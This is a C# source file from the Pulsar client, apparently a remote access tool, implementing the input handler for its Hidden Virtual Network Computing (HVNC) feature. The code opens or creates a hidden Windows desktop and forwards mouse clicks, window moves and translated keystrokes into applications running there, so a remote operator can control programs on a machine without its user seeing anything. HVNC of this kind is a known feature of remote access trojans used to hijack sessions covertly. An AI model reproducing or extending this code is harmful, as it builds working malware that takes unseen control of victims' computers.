using Pulsar.Common.Enums;
using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Pulsar.Client.Helper.HVNC
{
    /// <summary>
    /// Handles input for the Hidden Virtual Network Computing (HVNC) feature.
    /// </summary>
    public class InputHandler : IDisposable
    {
        #region Win32 API Imports

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        private static extern IntPtr WindowFromPoint(POINT point);

        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr PostMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        private static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

        [DllImport("user32.dll")]
        private static extern IntPtr ChildWindowFromPoint(IntPtr hWnd, POINT point);

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern bool PtInRect(ref RECT lprc, POINT pt);

        [DllImport("user32.dll")]
        private static extern bool SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll")]
        private static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        private static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern int MenuItemFromPoint(IntPtr hWnd, IntPtr hMenu, POINT pt);

        [DllImport("user32.dll")]
        private static extern int GetMenuItemID(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        private static extern IntPtr GetSubMenu(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        private static extern bool MoveWindow(IntPtr hWnd, int x, int y, int width, int height, bool repaint);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int RealGetWindowClass(IntPtr hwnd, [Out] StringBuilder pszType, int cchType);

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

        [DllImport("user32.dll")]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool IsWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool PrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

        [DllImport("user32.dll")]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        
        [DllImport("user32.dll")]
        private static extern bool GetClientRect(IntPtr hWnd, out RECT lpRect);
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, 
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] System.Text.StringBuilder pwszBuff, 
            int cchBuff, uint wFlags);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        #endregion

        #region Constants

        // Window style constants
        private const int GWL_STYLE = -16;
        private const int WS_DISABLED = 0x8000000;

        // Window message constants
        private const int WM_CHAR = 0x0102;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_LBUTTONUP = 0x0202;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_MOUSEMOVE = 0x0200;
        private const int WM_CLOSE = 0x0010;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int WM_NCHITTEST = 0x0084;
        private const int WM_RBUTTONUP = 0x0205;
        private const int WM_RBUTTONDOWN = 0x0204;
        private const int WM_DESTROY = 0x0002;

        // Mouse button constants
        private const int MK_LBUTTON = 0x0001;
        private const int MK_RBUTTON = 0x0002;

        // System command constants
        private const int SC_MINIMIZE = 0xF020;
        private const int SC_RESTORE = 0xF120;
        private const int SC_MAXIMIZE = 0xF030;

        // Hit test area constants
        private const int HTCAPTION = 2;
        private const int HTTOP = 12;
        private const int HTBOTTOM = 15;
        private const int HTLEFT = 10;
        private const int HTRIGHT = 11;
        private const int HTTOPLEFT = 13;
        private const int HTTOPRIGHT = 14;
        private const int HTBOTTOMLEFT = 16;
        private const int HTBOTTOMRIGHT = 17;
        private const int HTCLOSE = 20;
        private const int HTMINBUTTON = 8;
        private const int HTMAXBUTTON = 9;
        private const int HTTRANSPARENT = -1;

        // Window enumeration constants
        private const uint GW_HWNDPREV = 3;
        private const uint GW_HWNDNEXT = 2;

        // Miscellaneous constants
        private const int VK_RETURN = 0x0D;
        private const int MN_GETHMENU = 0x01E1;
        private const int BM_CLICK = 0x00F5;
        private const int MAX_PATH = 260;
        private const int SW_SHOWMAXIMIZED = 3;
        private const int SW_RESTORE = 9;

        private const int VK_SHIFT = 0x10;
        private const int VK_CONTROL = 0x11;
        private const int VK_MENU = 0x12; // Alt key
        private const int VK_LSHIFT = 0xA0;
        private const int VK_RSHIFT = 0xA1;
        private const int VK_LCONTROL = 0xA2;
        private const int VK_RCONTROL = 0xA3;
        private const int VK_LMENU = 0xA4; // Left Alt
        private const int VK_RMENU = 0xA5; // Right Alt
        private const int VK_CAPITAL = 0x14; // Caps Lock

        #endregion

        #region Fields and Properties

        private readonly string desktopName;
        private bool isMovingWindow = false;
        private POINT lastClickCoords = new POINT { x = 0, y = 0 };
        private POINT lastWindowDimensions = new POINT { x = 0, y = 0 };
        private IntPtr windowToMove = IntPtr.Zero;
        private IntPtr workingWindow = IntPtr.Zero;
        private static readonly object syncLock = new object();

        private bool isShiftPressed = false;
        private bool isControlPressed = false;
        private bool isAltPressed = false;
        private bool isCapsLockOn = false;

        /// <summary>
        /// Gets the desktop handle.
        /// </summary>
        public IntPtr Desktop { get; private set; } = IntPtr.Zero;

        #endregion

        #region Constructor and Dispose

        /// <summary>
        /// Initializes a new instance of the <see cref="InputHandler"/> class.
        /// </summary>
        /// <param name="desktopName">The name of the desktop to handle input for.</param>
        public InputHandler(string desktopName)
        {
            this.desktopName = desktopName;
            IntPtr desktopHandle = OpenDesktop(desktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (desktopHandle == IntPtr.Zero)
            {
                desktopHandle = CreateDesktop(desktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }
            this.Desktop = desktopHandle;
            
            InitializeModifierKeyStates();
        }

        /// <summary>
        /// Releases all resources used by the InputHandler.
        /// </summary>
        public void Dispose()
        {
            CloseDesktop(this.Desktop);
            GC.Collect();
        }

        #endregion

        #region Keyboard Helper Methods

        /// <summary>
        /// Initializes the modifier key states by checking the current system state.
        /// </summary>
        private void InitializeModifierKeyStates()
        {
            isShiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            isControlPressed = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
            isAltPressed = (GetKeyState(VK_MENU) & 0x8000) != 0;
            isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        }

        /// <summary>
        /// Handles keyboard input with proper modifier tracking and character conversion.
        /// </summary>
        /// <param name="msg">The keyboard message</param>
        /// <param name="wParam">The wParam containing the virtual key code</param>
        /// <param name="lParam">The original lParam</param>
        /// <param name="targetWindow">The target window to send messages to</param>
        private void HandleKeyboardInput(uint msg, IntPtr wParam, IntPtr lParam, IntPtr targetWindow)
        {
            int virtualKey = wParam.ToInt32();
            
            UpdateModifierKeyState(msg, virtualKey);
            
            if (msg == WM_KEYDOWN)
            {
                if (IsModifierKey(virtualKey))
                {
                    IntPtr modifierLParam = BuildKeyboardLParam(msg, wParam);
                    PostMessage(targetWindow, msg, wParam, modifierLParam);
                    return;
                }
                
                char[] chars = VirtualKeyToChar(virtualKey);
                bool isPrintableChar = (chars != null && chars.Length > 0 && chars[0] != '\0');
                
                if (isPrintableChar)
                {
                    IntPtr charLParam = BuildKeyboardLParam(WM_CHAR, wParam);
                    foreach (char ch in chars)
                    {
                        if (ch != '\0')
                        {
                            PostMessage(targetWindow, WM_CHAR, new IntPtr(ch), charLParam);
                        }
                    }
                }
                else
                {
                    IntPtr properLParam = BuildKeyboardLParam(msg, wParam);
                    PostMessage(targetWindow, msg, wParam, properLParam);
                }
            }
            else if (msg == WM_KEYUP)
            {
                IntPtr properLParam = BuildKeyboardLParam(msg, wParam);
                PostMessage(targetWindow, msg, wParam, properLParam);
            }
            else if (msg == WM_CHAR)
            {
                PostMessage(targetWindow, msg, wParam, lParam);
            }
        }

        /// <summary>
        /// Updates the internal modifier key state tracking.
        /// </summary>
        /// <param name="msg">The keyboard message</param>
        /// <param name="virtualKey">The virtual key code</param>
        private void UpdateModifierKeyState(uint msg, int virtualKey)
        {
            bool keyDown = (msg == WM_KEYDOWN);
            
            switch (virtualKey)
            {
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:
                    isShiftPressed = keyDown;
                    break;
                    
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL:
                    isControlPressed = keyDown;
                    break;
                    
                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:
                    isAltPressed = keyDown;
                    break;
                    
                case VK_CAPITAL:
                    if (keyDown)
                    {
                        isCapsLockOn = !isCapsLockOn;
                    }
                    break;
            }
        }

        /// <summary>
        /// Converts a virtual key to its character representation considering modifier states.
        /// </summary>
        /// <param name="virtualKey">The virtual key code</param>
        /// <returns>Array of characters, or null if not a printable character</returns>
        private char[] VirtualKeyToChar(int virtualKey)
        {
            if (IsModifierKey(virtualKey) || IsNonPrintableKey(virtualKey))
            {
                return null;
            }
            
            byte[] keyboardState = new byte[256];
            
            if (isShiftPressed)
            {
                keyboardState[VK_SHIFT] = 0x80;
            }
            
            if (isControlPressed)
            {
                keyboardState[VK_CONTROL] = 0x80;
            }
            
            if (isAltPressed)
            {
                keyboardState[VK_MENU] = 0x80;
            }
            
            if (isCapsLockOn)
            {
                keyboardState[VK_CAPITAL] = 0x01;
            }
            

            var buffer = new StringBuilder(64);
            uint scanCode = MapVirtualKey((uint)virtualKey, 0);
            
            int result = ToUnicode((uint)virtualKey, scanCode, keyboardState, buffer, buffer.Capacity, 0);
            
            if (result > 0)
            {
                return buffer.ToString().Substring(0, result).ToCharArray();
            }
            
            return null;
        }

        /// <summary>
        /// Determines if a virtual key is a modifier key.
        /// </summary>
        /// <param name="virtualKey">The virtual key code</param>
        /// <returns>True if the key is a modifier key</returns>
        private bool IsModifierKey(int virtualKey)
        {
            switch (virtualKey)
            {
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL:
                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:
                case VK_CAPITAL:
                    return true;
                default:
                    return false;
            }
        }

        /// <summary>
        /// Determines if a virtual key is a non-printable key (function keys, arrows, etc.).
        /// </summary>
        /// <param name="virtualKey">The virtual key code</param>
        /// <returns>True if the key is non-printable</returns>
        private bool IsNonPrintableKey(int virtualKey)
        {
            if (virtualKey >= 0x70 && virtualKey <= 0x7B) return true;
            
            switch (virtualKey)
            {
                case 0x21: // VK_PRIOR (Page Up)
                case 0x22: // VK_NEXT (Page Down)
                case 0x23: // VK_END
                case 0x24: // VK_HOME
                case 0x25: // VK_LEFT
                case 0x26: // VK_UP
                case 0x27: // VK_RIGHT
                case 0x28: // VK_DOWN
                case 0x2D: // VK_INSERT
                case 0x2E: // VK_DELETE
                case 0x5B: // VK_LWIN
                case 0x5C: // VK_RWIN
                case 0x5D: // VK_APPS
                case 0x91: // VK_SCROLL
                case 0x90: // VK_NUMLOCK
                case 0x0D: // VK_RETURN (Enter)
                case 0x1B: // VK_ESCAPE
                case 0x09: // VK_TAB
                case 0x08: // VK_BACK (Backspace)
                    return true;
                default:
                    return false;
            }
        }

        /// <summary>
        /// Builds the appropriate lParam value for keyboard messages.
        /// </summary>
        /// <param name="message">The keyboard message (WM_KEYDOWN, WM_KEYUP, WM_CHAR)</param>
        /// <param name="wParam">The wParam containing the virtual key code</param>
        /// <returns>The properly formatted lParam for the keyboard message</returns>
        private IntPtr BuildKeyboardLParam(uint message, IntPtr wParam)
        {
            int vk = wParam.ToInt32();
            uint scanCode = MapVirtualKey((uint)vk, 0);
            
            int lParam = 0;
            
            lParam |= 1;
            
            lParam |= (int)(scanCode << 16);
            
            if (IsExtendedKey(vk))
            {
                lParam |= (1 << 24);
            }
            
            if (message == WM_KEYUP)
            {
                lParam |= (1 << 30);
                lParam |= (1 << 31);
            }
            
            return new IntPtr(lParam);
        }

        /// <summary>
        /// Determines if a virtual key code represents an extended key.
        /// </summary>
        /// <param name="virtualKey">The virtual key code</param>
        /// <returns>True if the key is an extended key</returns>
        private bool IsExtendedKey(int virtualKey)
        {
            switch (virtualKey)
            {
                case 0x21: // VK_PRIOR (Page Up)
                case 0x22: // VK_NEXT (Page Down)
                case 0x23: // VK_END
                case 0x24: // VK_HOME
                case 0x25: // VK_LEFT
                case 0x26: // VK_UP
                case 0x27: // VK_RIGHT
                case 0x28: // VK_DOWN
                case 0x2D: // VK_INSERT
                case 0x2E: // VK_DELETE
                case 0x5B: // VK_LWIN
                case 0x5C: // VK_RWIN
                case 0x5D: // VK_APPS
                case 0xA0: // VK_LSHIFT (when differentiated from VK_SHIFT)
                case 0xA1: // VK_RSHIFT
                case 0xA2: // VK_LCONTROL
                case 0xA3: // VK_RCONTROL
                case 0xA4: // VK_LMENU (Left Alt)
                case 0xA5: // VK_RMENU (Right Alt)
                case 0x91: // VK_SCROLL
                    return true;
                default:
                    return false;
            }
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Gets the X coordinate from an lParam.
        /// </summary>
        public static int GetXCoordinate(IntPtr lParam)
        {
            return (int)((short)(lParam.ToInt32() & 0xFFFF));
        }

        /// <summary>
        /// Gets the Y coordinate from an lParam.
        /// </summary>
        public static int GetYCoordinate(IntPtr lParam)
        {
            return (int)((short)(lParam.ToInt32() >> 16 & 0xFFFF));
        }

        /// <summary>
        /// Creates an lParam from X and Y coordinates.
        /// </summary>
        public static IntPtr MakeLParam(int lowWord, int highWord)
        {
            return new IntPtr(highWord << 16 | (lowWord & 0xFFFF));
        }

        /// <summary>
        /// Calculates relative coordinates from screen to window
        /// </summary>
        private POINT ScreenToWindow(int screenX, int screenY, int windowX, int windowY, int windowWidth, int windowHeight)
        {
            int relativeX = screenX - windowX;
            int relativeY = screenY - windowY;

            if (relativeX >= 0 && relativeX < windowWidth && relativeY >= 0 && relativeY < windowHeight)
                return new POINT { x = relativeX, y = relativeY };
            else
                return new POINT { x = -1, y = -1 };
        }

        #endregion

        #region Input Processing

        /// <summary>
        /// Processes an input message and sends it to the appropriate window.
        /// </summary>
        /// <param name="msg">The message to process.</param>
        /// <param name="wParam">The wParam of the message.</param>
        /// <param name="lParam">The lParam of the message.</param>
        public void Input(uint msg, IntPtr wParam, IntPtr lParam)
        {
            lock (syncLock)
            {
                SetThreadDesktop(this.Desktop);

                // Handle mouse messages
                if (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP || 
                    msg == WM_RBUTTONDOWN || msg == WM_RBUTTONUP || 
                    msg == WM_MOUSEMOVE)
                {
                    int x = GetXCoordinate(lParam);
                    int y = GetYCoordinate(lParam);
                    POINT cursorPosition = new POINT { x = x, y = y };
                    
                    bool isLeft = (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP);
                    bool isUp = (msg == WM_LBUTTONUP || msg == WM_RBUTTONUP);

                    if (isMovingWindow && isUp && isLeft)
                    {
                        // If we were moving a window and now released the button, complete the move
                        SetWindowPos(windowToMove, IntPtr.Zero, 
                            x - lastClickCoords.x, 
                            y - lastClickCoords.y,
                            lastWindowDimensions.x, 
                            lastWindowDimensions.y, 
                            0);
                        isMovingWindow = false;
                    }

                    // Get the window under the cursor
                    IntPtr hwnd = WindowFromPoint(cursorPosition);
                    workingWindow = hwnd;

                    if (hwnd != IntPtr.Zero)
                    {
                        // Get window information
                        RECT windowRect;
                        GetWindowRect(hwnd, out windowRect);
                        
                        // Calculate window position and size
                        int windowX = windowRect.left;
                        int windowY = windowRect.top;
                        int windowWidth = windowRect.right - windowRect.left;
                        int windowHeight = windowRect.bottom - windowRect.top;
                        
                        // Calculate position relative to window
                        POINT clickCoords = ScreenToWindow(x, y, windowX, windowY, windowWidth, windowHeight);
                        
                        // Get hit test result to determine what part of the window was clicked
                        IntPtr hitTestResult = SendMessage(hwnd, WM_NCHITTEST, IntPtr.Zero, lParam);
                        int hitTestResultInt = hitTestResult.ToInt32();

                        if (hitTestResultInt == HTCLOSE && msg == WM_LBUTTONUP)
                        {
                            // Close button clicked
                            Debug.WriteLine("Closing window");
                            PostMessage(hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                            PostMessage(hwnd, WM_DESTROY, IntPtr.Zero, IntPtr.Zero);
                        }
                        else if (hitTestResultInt == HTCAPTION)
                        {
                            // Title bar clicked
                            if (!isUp && isLeft && msg == WM_LBUTTONDOWN)
                            {
                                // Start window move operation
                                lastClickCoords = clickCoords;
                                lastWindowDimensions = new POINT { x = windowWidth, y = windowHeight };
                                isMovingWindow = true;
                                windowToMove = hwnd;
                                Debug.WriteLine("Starting window move");
                            }
                        }
                        else if (hitTestResultInt == HTMAXBUTTON && msg == WM_LBUTTONUP)
                        {
                            // Maximize/Restore button clicked
                            WINDOWPLACEMENT windowPlacement = default;
                            windowPlacement.length = Marshal.SizeOf<WINDOWPLACEMENT>(windowPlacement);
                            GetWindowPlacement(hwnd, ref windowPlacement);
                            
                            if ((windowPlacement.flags & SW_SHOWMAXIMIZED) != 0)
                            {
                                Debug.WriteLine("Restoring window");
                                PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
                            }
                            else
                            {
                                Debug.WriteLine("Maximizing window");
                                PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
                            }
                        }
                        else if (hitTestResultInt == HTMINBUTTON && msg == WM_LBUTTONUP)
                        {
                            // Minimize button clicked
                            Debug.WriteLine("Minimizing window");
                            PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
                        }
                        else
                        {
                            // Regular window area clicked - forward the mouse message
                            IntPtr param = isLeft ? new IntPtr(MK_LBUTTON) : new IntPtr(MK_RBUTTON);
                            IntPtr translatedLParam = MakeLParam(clickCoords.x, clickCoords.y);
                            PostMessage(hwnd, msg, param, translatedLParam);
                        }
                    }
                }
                // Handle keyboard messages
                if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
                {
                    if (workingWindow != IntPtr.Zero)
                    {
                        HandleKeyboardInput(msg, wParam, lParam, workingWindow);
                    }
                }
            }
        }

        #endregion

        #region Nested Types

        /// <summary>
        /// Desktop access rights flags.
        /// </summary>
        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE,
            DESKTOP_READOBJECTS,
            DESKTOP_CREATEWINDOW,
            DESKTOP_CREATEMENU = 4U,
            DESKTOP_HOOKCONTROL = 8U,
            DESKTOP_JOURNALRECORD = 16U,
            DESKTOP_JOURNALPLAYBACK = 32U,
            DESKTOP_ENUMERATE = 64U,
            DESKTOP_WRITEOBJECTS = 128U,
            DESKTOP_SWITCHDESKTOP = 256U,
            GENERIC_ALL = 511U
        }

        /// <summary>
        /// Represents a point (x,y coordinates).
        /// </summary>
        public struct POINT
        {
            public int x;
            public int y;
        }

        /// <summary>
        /// Represents a rectangle.
        /// </summary>
        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        /// <summary>
        /// Contains information about the placement of a window.
        /// </summary>
        public struct WINDOWPLACEMENT
        {
            public int length;
            public int flags;
            public int showCmd;
            public POINT ptMinPosition;
            public POINT ptMaxPosition;
            public RECT rcNormalPosition;
        }

        #endregion
    }
}
